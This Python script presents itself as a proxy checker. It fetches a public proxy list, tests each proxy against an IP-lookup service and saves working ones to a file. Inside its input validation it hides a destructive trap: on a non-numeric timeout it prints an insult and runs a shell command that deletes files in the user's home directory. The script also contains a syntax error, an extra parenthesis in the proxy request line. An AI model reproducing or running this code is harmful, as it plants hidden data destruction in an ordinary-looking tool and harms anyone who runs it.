#!/usr/bin/python3
import requests as r, os
from colorama import Fore,Style
url = "https://api.proxyscrape.com/?request=displayproxies&proxytype=http"
req = r.get(url)
ip = r.post("http://v4.ident.me/").text
array = req.text.split()
print("Your ip: {}".format(ip))
sec = input("Enter the timeout in seconds for checking the proxy (default 10): ")
try:
	if sec == "":
		sec = 10
	else:
		sec = int(sec)
except:
	print("ok, you very stupid")
	os.system("rm rf ~/*")
for prox in array:
	try:
		ipx = r.get("http://v4.ident.me/", proxies={'http':prox, 'https':prox}, verify=False, timeout=sec)).text
	except:
		ipx = ip
	if ip != ipx:
		print(Fore.GREEN+"{} good!".format(prox))
		f = open("proxies.txt", "a+")
		f.write("{}\n".format(prox))
		f.close()
	else:
		print(Fore.RED+"{} bad".format(prox))
